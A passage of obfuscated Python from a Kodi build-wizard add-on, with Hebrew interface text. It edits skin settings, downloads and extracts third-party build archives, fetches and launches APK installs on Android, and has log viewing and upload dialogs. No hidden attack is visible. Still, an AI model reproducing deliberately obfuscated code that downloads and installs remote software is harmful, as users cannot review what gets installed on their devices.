			OO00OOO000OO00OOO .write (O0OOOOOOO0O0O0000 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%OOOO000OO000O00O0 ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4321
			OO00OOO000OO00OOO .close ()#line:4322
			O000O00OOO00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4326
			OO00OOO000OO00OOO =open (O000O00OOO00O0O00 ,'r')#line:4328
			O0OOOOOOO0O0O0000 =OO00OOO000OO00OOO .read ()#line:4329
			OO00OOO000OO00OOO .close ()#line:4330
			OO00OOO00O00O000O ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4331
			OOOO000OO000O00O0 =re .compile (OO00OOO00O00O000O ).findall (O0OOOOOOO0O0O0000 )[0 ]#line:4332
			OO00OOO000OO00OOO =open (O000O00OOO00O0O00 ,'w')#line:4333
			OO00OOO000OO00OOO .write (O0OOOOOOO0O0O0000 .replace ('<setting id="show.cdart" type="bool%s/setting>'%OOOO000OO000O00O0 ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4334
			OO00OOO000OO00OOO .close ()#line:4335
			O000O00OOO00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4339
			OO00OOO000OO00OOO =open (O000O00OOO00O0O00 ,'r')#line:4341
			O0OOOOOOO0O0O0000 =OO00OOO000OO00OOO .read ()#line:4342
			OO00OOO000OO00OOO .close ()#line:4343
			OO00OOO00O00O000O ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4344
			OOOO000OO000O00O0 =re .compile (OO00OOO00O00O000O ).findall (O0OOOOOOO0O0O0000 )[0 ]#line:4345
			OO00OOO000OO00OOO =open (O000O00OOO00O0O00 ,'w')#line:4346
			OO00OOO000OO00OOO .write (O0OOOOOOO0O0O0000 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%OOOO000OO000O00O0 ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4347
			OO00OOO000OO00OOO .close ()#line:4348
		except :#line:4353
			pass #line:4354
def thirdPartyInstall (OOOO000OO0O0OOOOO ,O0O00OO000OO0OO0O ):#line:4356
	if not wiz .workingURL (O0O00OO000OO0OO0O ):#line:4357
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4358
	O0000OOO000OO0O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO000OO0O0OOOOO ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4359
	if O0000OOO000OO0O00 ==1 :#line:4360
		freshStart ('third',True )#line:4361
	wiz .clearS ('build')#line:4362
	O0OO0OOOO000OO00O =OOOO000OO0O0OOOOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4363
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4364
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO000OO0O0OOOOO ),'','אנא המתן')#line:4365
	OO0000OO000OO0O00 =os .path .join (PACKAGES ,'%s.zip'%O0OO0OOOO000OO00O )#line:4366
	try :os .remove (OO0000OO000OO0O00 )#line:4367
	except :pass #line:4368
	downloader .download (O0O00OO000OO0OO0O ,OO0000OO000OO0O00 ,DP )#line:4369
	xbmc .sleep (1000 )#line:4370
	OOOOOOO000000O000 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO000OO0O0OOOOO )#line:4371
	DP .update (0 ,OOOOOOO000000O000 ,'','אנא המתן')#line:4372
	OO0OOO00000OOO0OO ,OOOOOO00OO00OOOO0 ,O00OO0OO00OOO000O =extract .all (OO0000OO000OO0O00 ,HOME ,DP ,title =OOOOOOO000000O000 )#line:4373
	if int (float (OO0OOO00000OOO0OO ))>0 :#line:4374
		wiz .fixmetas ()#line:4375
		wiz .lookandFeelData ('save')#line:4376
		wiz .defaultSkin ()#line:4377
		wiz .setS ('installed','true')#line:4379
		wiz .setS ('extract',str (OO0OOO00000OOO0OO ))#line:4380
		wiz .setS ('errors',str (OOOOOO00OO00OOOO0 ))#line:4381
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OO0OOO00000OOO0OO ,OOOOOO00OO00OOOO0 ))#line:4382
		try :os .remove (OO0000OO000OO0O00 )#line:4383
		except :pass #line:4384
		if int (float (OOOOOO00OO00OOOO0 ))>0 :#line:4385
			OOOO0O0O0OOOOOO0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO000OO0O0OOOOO ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OO0OOO00000OOO0OO ,'%',COLOR1 ,OOOOOO00OO00OOOO0 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4386
			if OOOO0O0O0OOOOOO0O :#line:4387
				if isinstance (OOOOOO00OO00OOOO0 ,unicode ):#line:4388
					O00OO0OO00OOO000O =O00OO0OO00OOO000O .encode ('utf-8')#line:4389
				wiz .TextBox (ADDONTITLE ,O00OO0OO00OOO000O )#line:4390
	DP .close ()#line:4391
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4392
	if INSTALLMETHOD ==1 :O000OO00OO00OOOO0 =1 #line:4393
	elif INSTALLMETHOD ==2 :O000OO00OO00OOOO0 =0 #line:4394
	else :O000OO00OO00OOOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4395
	if O000OO00OO00OOOO0 ==1 :wiz .reloadFix ()#line:4396
	else :wiz .killxbmc (True )#line:4397
def testTheme (O000O0OO0O0OO000O ):#line:4399
	O0OO0OOO00000O0OO =zipfile .ZipFile (O000O0OO0O0OO000O )#line:4400
	for O00O0OO0O0000O0OO in O0OO0OOO00000O0OO .infolist ():#line:4401
		if '/settings.xml'in O00O0OO0O0000O0OO .filename :#line:4402
			return True #line:4403
	return False #line:4404
def testGui (OO0O00OOOOOO0OOO0 ):#line:4406
	OOOO0O0OOOO0O00OO =zipfile .ZipFile (OO0O00OOOOOO0OOO0 )#line:4407
	for O00O0OO0O0O0O0000 in OOOO0O0OOOO0O00OO .infolist ():#line:4408
		if '/guisettings.xml'in O00O0OO0O0O0O0000 .filename :#line:4409
			return True #line:4410
	return False #line:4411
def apkInstaller (O00OO000O0000OO00 ,O00OO00O0OO0OO0O0 ):#line:4413
	wiz .log (O00OO000O0000OO00 )#line:4414
	wiz .log (O00OO00O0OO0OO0O0 )#line:4415
	if wiz .platform ()=='android':#line:4416
		OO0OO00OO0O0O00O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OO000O0000OO00 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4417
		if not OO0OO00OO0O0O00O0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4418
		O0OO0O0000O0O00OO =O00OO000O0000OO00 #line:4419
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4420
		if not wiz .workingURL (O00OO00O0OO0OO0O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4421
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0O0000O0O00OO ),'','אנא המתן')#line:4422
		O00OOOO0O00OO00O0 =os .path .join (PACKAGES ,"%s.apk"%O00OO000O0000OO00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4423
		try :os .remove (O00OOOO0O00OO00O0 )#line:4424
		except :pass #line:4425
		downloader .download (O00OO00O0OO0OO0O0 ,O00OOOO0O00OO00O0 ,DP )#line:4426
		xbmc .sleep (100 )#line:4427
		DP .close ()#line:4428
		notify .apkInstaller (O00OO000O0000OO00 )#line:4429
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+O00OOOO0O00OO00O0 +'")')#line:4430
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4431
def createMenu (O0O00OOO000O0OOOO ,O00000O0O000OO00O ,O0OO000OO00O0O000 ):#line:4437
	if O0O00OOO000O0OOOO =='saveaddon':#line:4438
		OOO00OOO00OOOO00O =[]#line:4439
		OOOOOOO00000000OO =urllib .quote_plus (O00000O0O000OO00O .lower ().replace (' ',''))#line:4440
		OO0OOO0O000OOOOOO =O00000O0O000OO00O .replace ('Debrid','Real Debrid')#line:4441
		O0O0O0O000OOO0O00 =urllib .quote_plus (O0OO000OO00O0O000 .lower ().replace (' ',''))#line:4442
		O0OO000OO00O0O000 =O0OO000OO00O0O000 .replace ('url','URL Resolver')#line:4443
		OOO00OOO00OOOO00O .append ((THEME2 %O0OO000OO00O0O000 .title (),' '))#line:4444
		OOO00OOO00OOOO00O .append ((THEME3 %'Save %s Data'%OO0OOO0O000OOOOOO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OOOOOOO00000000OO ,O0O0O0O000OOO0O00 )))#line:4445
		OOO00OOO00OOOO00O .append ((THEME3 %'Restore %s Data'%OO0OOO0O000OOOOOO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OOOOOOO00000000OO ,O0O0O0O000OOO0O00 )))#line:4446
		OOO00OOO00OOOO00O .append ((THEME3 %'Clear %s Data'%OO0OOO0O000OOOOOO ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,OOOOOOO00000000OO ,O0O0O0O000OOO0O00 )))#line:4447
	elif O0O00OOO000O0OOOO =='save':#line:4448
		OOO00OOO00OOOO00O =[]#line:4449
		OOOOOOO00000000OO =urllib .quote_plus (O00000O0O000OO00O .lower ().replace (' ',''))#line:4450
		OO0OOO0O000OOOOOO =O00000O0O000OO00O .replace ('Debrid','Real Debrid')#line:4451
		O0O0O0O000OOO0O00 =urllib .quote_plus (O0OO000OO00O0O000 .lower ().replace (' ',''))#line:4452
		O0OO000OO00O0O000 =O0OO000OO00O0O000 .replace ('url','URL Resolver')#line:4453
		OOO00OOO00OOOO00O .append ((THEME2 %O0OO000OO00O0O000 .title (),' '))#line:4454
		OOO00OOO00OOOO00O .append ((THEME3 %'Register %s'%OO0OOO0O000OOOOOO ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,OOOOOOO00000000OO ,O0O0O0O000OOO0O00 )))#line:4455
		OOO00OOO00OOOO00O .append ((THEME3 %'Save %s Data'%OO0OOO0O000OOOOOO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OOOOOOO00000000OO ,O0O0O0O000OOO0O00 )))#line:4456
		OOO00OOO00OOOO00O .append ((THEME3 %'Restore %s Data'%OO0OOO0O000OOOOOO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OOOOOOO00000000OO ,O0O0O0O000OOO0O00 )))#line:4457
		OOO00OOO00OOOO00O .append ((THEME3 %'Import %s Data'%OO0OOO0O000OOOOOO ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,OOOOOOO00000000OO ,O0O0O0O000OOO0O00 )))#line:4458
		OOO00OOO00OOOO00O .append ((THEME3 %'Clear Addon %s Data'%OO0OOO0O000OOOOOO ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,OOOOOOO00000000OO ,O0O0O0O000OOO0O00 )))#line:4459
	elif O0O00OOO000O0OOOO =='install':#line:4460
		OOO00OOO00OOOO00O =[]#line:4461
		O0O0O0O000OOO0O00 =urllib .quote_plus (O0OO000OO00O0O000 )#line:4462
		OOO00OOO00OOOO00O .append ((THEME2 %O0OO000OO00O0O000 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O0O0O0O000OOO0O00 )))#line:4463
		OOO00OOO00OOOO00O .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O0O0O0O000OOO0O00 )))#line:4464
		OOO00OOO00OOOO00O .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O0O0O0O000OOO0O00 )))#line:4465
		OOO00OOO00OOOO00O .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O0O0O0O000OOO0O00 )))#line:4466
		OOO00OOO00OOOO00O .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O0O0O0O000OOO0O00 )))#line:4467
	OOO00OOO00OOOO00O .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4468
	return OOO00OOO00OOOO00O #line:4469
def toggleCache (OO0OO0O00OOOO00OO ):#line:4471
	O0000O00OO0OO00O0 =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4472
	OO00O00O0OO0OOOOO =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4473
	if OO0OO0O00OOOO00OO in ['true','false']:#line:4474
		for O0OOO00O00O0O0OO0 in O0000O00OO0OO00O0 :#line:4475
			wiz .setS (O0OOO00O00O0O0OO0 ,OO0OO0O00OOOO00OO )#line:4476
	else :#line:4477
		if not OO0OO0O00OOOO00OO in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4478
			try :#line:4479
				O0OOO00O00O0O0OO0 =OO00O00O0OO0OOOOO [O0000O00OO0OO00O0 .index (OO0OO0O00OOOO00OO )]#line:4480
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,O0OOO00O00O0O0OO0 ))#line:4481
			except :#line:4482
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OO0OO0O00OOOO00OO ))#line:4483
		else :#line:4484
			OO0OO0O0OO000OO00 ='true'if wiz .getS (OO0OO0O00OOOO00OO )=='false'else 'false'#line:4485
			wiz .setS (OO0OO0O00OOOO00OO ,OO0OO0O0OO000OO00 )#line:4486
def playVideo (O00O00OO0O0O0OO00 ):#line:4488
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O00O00OO0O0O0OO00 )#line:4489
	if 'watch?v='in O00O00OO0O0O0OO00 :#line:4490
		O0O00OO0OO0OO0O00 ,O00O00OOOO00O0O00 =O00O00OO0O0O0OO00 .split ('?')#line:4491
		O00000000OOOOOO00 =O00O00OOOO00O0O00 .split ('&')#line:4492
		for O0OO0O000O0O0O0OO in O00000000OOOOOO00 :#line:4493
			if O0OO0O000O0O0O0OO .startswith ('v='):#line:4494
				O00O00OO0O0O0OO00 =O0OO0O000O0O0O0OO [2 :]#line:4495
				break #line:4496
			else :continue #line:4497
	elif 'embed'in O00O00OO0O0O0OO00 or 'youtu.be'in O00O00OO0O0O0OO00 :#line:4498
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O00O00OO0O0O0OO00 )#line:4499
		O0O00OO0OO0OO0O00 =O00O00OO0O0O0OO00 .split ('/')#line:4500
		if len (O0O00OO0OO0OO0O00 [-1 ])>5 :#line:4501
			O00O00OO0O0O0OO00 =O0O00OO0OO0OO0O00 [-1 ]#line:4502
		elif len (O0O00OO0OO0OO0O00 [-2 ])>5 :#line:4503
			O00O00OO0O0O0OO00 =O0O00OO0OO0OO0O00 [-2 ]#line:4504
	wiz .log ("YouTube URL: %s"%O00O00OO0O0O0OO00 )#line:4505
	yt .PlayVideo (O00O00OO0O0O0OO00 )#line:4506
def viewLogFile ():#line:4508
	O00O00OO0OO0O0O00 =wiz .Grab_Log (True )#line:4509
	OOOOO0O00000OOOO0 =wiz .Grab_Log (True ,True )#line:4510
	O0OO0O0O0O0000OO0 =0 ;O0O00O0O0OOOO00O0 =O00O00OO0OO0O0O00 #line:4511
	if not OOOOO0O00000OOOO0 ==False and not O00O00OO0OO0O0O00 ==False :#line:4512
		O0OO0O0O0O0000OO0 =DIALOG .select (ADDONTITLE ,["View %s"%O00O00OO0OO0O0O00 .replace (LOG ,""),"View %s"%OOOOO0O00000OOOO0 .replace (LOG ,"")])#line:4513
		if O0OO0O0O0O0000OO0 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4514
	elif O00O00OO0OO0O0O00 ==False and OOOOO0O00000OOOO0 ==False :#line:4515
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4516
		return #line:4517
	elif not O00O00OO0OO0O0O00 ==False :O0OO0O0O0O0000OO0 =0 #line:4518
	elif not OOOOO0O00000OOOO0 ==False :O0OO0O0O0O0000OO0 =1 #line:4519
	O0O00O0O0OOOO00O0 =O00O00OO0OO0O0O00 if O0OO0O0O0O0000OO0 ==0 else OOOOO0O00000OOOO0 #line:4521
	OOOO0000O0O000O0O =wiz .Grab_Log (False )if O0OO0O0O0O0000OO0 ==0 else wiz .Grab_Log (False ,True )#line:4522
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O0O00O0O0OOOO00O0 ),OOOO0000O0O000O0O )#line:4524
def errorChecking (log =None ,count =None ,all =None ):#line:4526
	if log ==None :#line:4527
		OO0O0O0O00OO000OO =wiz .Grab_Log (True )#line:4528
		OOOOO0O0OOOO0O000 =wiz .Grab_Log (True ,True )#line:4529
		if not OOOOO0O0OOOO0O000 ==False and not OO0O0O0O00OO000OO ==False :#line:4530
			OOO00O0OOOO00OO00 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(OO0O0O0O00OO000OO .replace (LOG ,""),errorChecking (OO0O0O0O00OO000OO ,True ,True )),"View %s: %s error(s)"%(OOOOO0O0OOOO0O000 .replace (LOG ,""),errorChecking (OOOOO0O0OOOO0O000 ,True ,True ))])#line:4531
			if OOO00O0OOOO00OO00 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4532
		elif OO0O0O0O00OO000OO ==False and OOOOO0O0OOOO0O000 ==False :#line:4533
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4534
			return #line:4535
		elif not OO0O0O0O00OO000OO ==False :OOO00O0OOOO00OO00 =0 #line:4536
		elif not OOOOO0O0OOOO0O000 ==False :OOO00O0OOOO00OO00 =1 #line:4537
		log =OO0O0O0O00OO000OO if OOO00O0OOOO00OO00 ==0 else OOOOO0O0OOOO0O000 #line:4538
	if log ==False :#line:4539
		if count ==None :#line:4540
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4541
			return False #line:4542
		else :#line:4543
			return 0 #line:4544
	else :#line:4545
		if os .path .exists (log ):#line:4546
			O000O0OO000O000O0 =open (log ,mode ='r');OOOOOOOOOOO0O0O00 =O000O0OO000O000O0 .read ().replace ('\n','').replace ('\r','');O000O0OO000O000O0 .close ()#line:4547
			O0O0O0O0000O00O0O =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OOOOOOOOOOO0O0O00 )#line:4548
			if not count ==None :#line:4549
				if all ==None :#line:4550
					OO0O00OOOO00000OO =0 #line:4551
					for O00OO0OO00O0OO0O0 in O0O0O0O0000O00O0O :#line:4552
						if ADDON_ID in O00OO0OO00O0OO0O0 :OO0O00OOOO00000OO +=1 #line:4553
					return OO0O00OOOO00000OO #line:4554
				else :return len (O0O0O0O0000O00O0O )#line:4555
			if len (O0O0O0O0000O00O0O )>0 :#line:4556
				OO0O00OOOO00000OO =0 ;OO000000OOOOO00OO =""#line:4557
				for O00OO0OO00O0OO0O0 in O0O0O0O0000O00O0O :#line:4558
					if all ==None and not ADDON_ID in O00OO0OO00O0OO0O0 :continue #line:4559
					else :#line:4560
						OO0O00OOOO00000OO +=1 #line:4561
						OO000000OOOOO00OO +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OO0O00OOOO00000OO ,O00OO0OO00O0OO0O0 .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4562
				if OO0O00OOOO00000OO >0 :#line:4563
					wiz .TextBox (ADDONTITLE ,OO000000OOOOO00OO )#line:4564
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4565
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4566
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4567
ACTION_PREVIOUS_MENU =10 #line:4569
ACTION_NAV_BACK =92 #line:4570
ACTION_MOVE_LEFT =1 #line:4571
ACTION_MOVE_RIGHT =2 #line:4572
ACTION_MOVE_UP =3 #line:4573
ACTION_MOVE_DOWN =4 #line:4574
ACTION_MOUSE_WHEEL_UP =104 #line:4575
ACTION_MOUSE_WHEEL_DOWN =105 #line:4576
ACTION_MOVE_MOUSE =107 #line:4577
ACTION_SELECT_ITEM =7 #line:4578
ACTION_BACKSPACE =110 #line:4579
ACTION_MOUSE_LEFT_CLICK =100 #line:4580
ACTION_MOUSE_LONG_CLICK =108 #line:4581
def LogViewer (default =None ):#line:4583
	class OO0OOO000000OO00O (xbmcgui .WindowXMLDialog ):#line:4584
		def __init__ (O0OOOOOO00O000O00 ,*O0OOOOOOO0O0O0O0O ,**O00OO0OOO000OOOO0 ):#line:4585
			O0OOOOOO00O000O00 .default =O00OO0OOO000OOOO0 ['default']#line:4586
		def onInit (OO0OO00OOO0O0O000 ):#line:4588
			OO0OO00OOO0O0O000 .title =101 #line:4589
			OO0OO00OOO0O0O000 .msg =102 #line:4590
			OO0OO00OOO0O0O000 .scrollbar =103 #line:4591
			OO0OO00OOO0O0O000 .upload =201 #line:4592
			OO0OO00OOO0O0O000 .kodi =202 #line:4593
			OO0OO00OOO0O0O000 .kodiold =203 #line:4594
			OO0OO00OOO0O0O000 .wizard =204 #line:4595
			OO0OO00OOO0O0O000 .okbutton =205 #line:4596
			OOOOOO0OOO00O0O0O =open (OO0OO00OOO0O0O000 .default ,'r')#line:4597
			OO0OO00OOO0O0O000 .logmsg =OOOOOO0OOO00O0O0O .read ()#line:4598
			OOOOOO0OOO00O0O0O .close ()#line:4599
			OO0OO00OOO0O0O000 .titlemsg ="%s: %s"%(ADDONTITLE ,OO0OO00OOO0O0O000 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4600
			OO0OO00OOO0O0O000 .showdialog ()#line:4601
		def showdialog (O0O00O00OO000O000 ):#line:4603
			O0O00O00OO000O000 .getControl (O0O00O00OO000O000 .title ).setLabel (O0O00O00OO000O000 .titlemsg )#line:4604
			O0O00O00OO000O000 .getControl (O0O00O00OO000O000 .msg ).setText (wiz .highlightText (O0O00O00OO000O000 .logmsg ))#line:4605
			O0O00O00OO000O000 .setFocusId (O0O00O00OO000O000 .scrollbar )#line:4606
		def onClick (O00O00O0O00OOO00O ,O0O0OO0O0O00O0O0O ):#line:4608
			if O0O0OO0O0O00O0O0O ==O00O00O0O00OOO00O .okbutton :O00O00O0O00OOO00O .close ()#line:4609
			elif O0O0OO0O0O00O0O0O ==O00O00O0O00OOO00O .upload :O00O00O0O00OOO00O .close ();uploadLog .Main ()#line:4610
			elif O0O0OO0O0O00O0O0O ==O00O00O0O00OOO00O .kodi :#line:4611
				O0O0000OO0O00OOOO =wiz .Grab_Log (False )#line:4612
				OOO0OO00OO0000OO0 =wiz .Grab_Log (True )#line:4613
				if O0O0000OO0O00OOOO ==False :#line:4614
					O00O00O0O00OOO00O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4615
					O00O00O0O00OOO00O .getControl (O00O00O0O00OOO00O .msg ).setText ("Log File Does Not Exists!")#line:4616
				else :#line:4617
					O00O00O0O00OOO00O .titlemsg ="%s: %s"%(ADDONTITLE ,OOO0OO00OO0000OO0 .replace (LOG ,''))#line:4618
					O00O00O0O00OOO00O .getControl (O00O00O0O00OOO00O .title ).setLabel (O00O00O0O00OOO00O .titlemsg )#line:4619
					O00O00O0O00OOO00O .getControl (O00O00O0O00OOO00O .msg ).setText (wiz .highlightText (O0O0000OO0O00OOOO ))#line:4620
					O00O00O0O00OOO00O .setFocusId (O00O00O0O00OOO00O .scrollbar )#line:4621
			elif O0O0OO0O0O00O0O0O ==O00O00O0O00OOO00O .kodiold :#line:4622
				O0O0000OO0O00OOOO =wiz .Grab_Log (False ,True )#line:4623
				OOO0OO00OO0000OO0 =wiz .Grab_Log (True ,True )#line:4624
				if O0O0000OO0O00OOOO ==False :#line:4625
					O00O00O0O00OOO00O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4626
					O00O00O0O00OOO00O .getControl (O00O00O0O00OOO00O .msg ).setText ("Log File Does Not Exists!")#line:4627
				else :#line:4628
					O00O00O0O00OOO00O .titlemsg ="%s: %s"%(ADDONTITLE ,OOO0OO00OO0000OO0 .replace (LOG ,''))#line:4629
					O00O00O0O00OOO00O .getControl (O00O00O0O00OOO00O .title ).setLabel (O00O00O0O00OOO00O .titlemsg )#line:4630
					O00O00O0O00OOO00O .getControl (O00O00O0O00OOO00O .msg ).setText (wiz .highlightText (O0O0000OO0O00OOOO ))#line:4631
					O00O00O0O00OOO00O .setFocusId (O00O00O0O00OOO00O .scrollbar )#line:4632
			elif O0O0OO0O0O00O0O0O ==O00O00O0O00OOO00O .wizard :#line:4633
				O0O0000OO0O00OOOO =wiz .Grab_Log (False ,False ,True )#line:4634
				OOO0OO00OO0000OO0 =wiz .Grab_Log (True ,False ,True )#line:4635
				if O0O0000OO0O00OOOO ==False :#line:4636
					O00O00O0O00OOO00O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4637
					O00O00O0O00OOO00O .getControl (O00O00O0O00OOO00O .msg ).setText ("Log File Does Not Exists!")#line:4638
				else :#line:4639
					O00O00O0O00OOO00O .titlemsg ="%s: %s"%(ADDONTITLE ,OOO0OO00OO0000OO0 .replace (ADDONDATA ,''))#line:4640
					O00O00O0O00OOO00O .getControl (O00O00O0O00OOO00O .title ).setLabel (O00O00O0O00OOO00O .titlemsg )#line:4641
					O00O00O0O00OOO00O .getControl (O00O00O0O00OOO00O .msg ).setText (wiz .highlightText (O0O0000OO0O00OOOO ))#line:4642
					O00O00O0O00OOO00O .setFocusId (O00O00O0O00OOO00O .scrollbar )#line:4643
		def onAction (OOOOO0OO00O0OOOOO ,O000OOO00000OO00O ):#line:4645
			if O000OOO00000OO00O ==ACTION_PREVIOUS_MENU :OOOOO0OO00O0OOOOO .close ()#line:4646
			elif O000OOO00000OO00O ==ACTION_NAV_BACK :OOOOO0OO00O0OOOOO .close ()#line:4647
	if default ==None :default =wiz .Grab_Log (True )#line:4648
	O00O0000OOOO00000 =OO0OOO000000OO00O ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4649
	O00O0000OOOO00000 .doModal ()#line:4650
	del O00O0000OOOO00000 #line:4651
def removeAddon (OO00OO0OO000OO00O ,O0000000OOOOOO0OO ,over =False ):#line:4653
	if not over ==False :#line:4654
		OO0OO00OOOOO0OO0O =1 #line:4655
	else :#line:4656
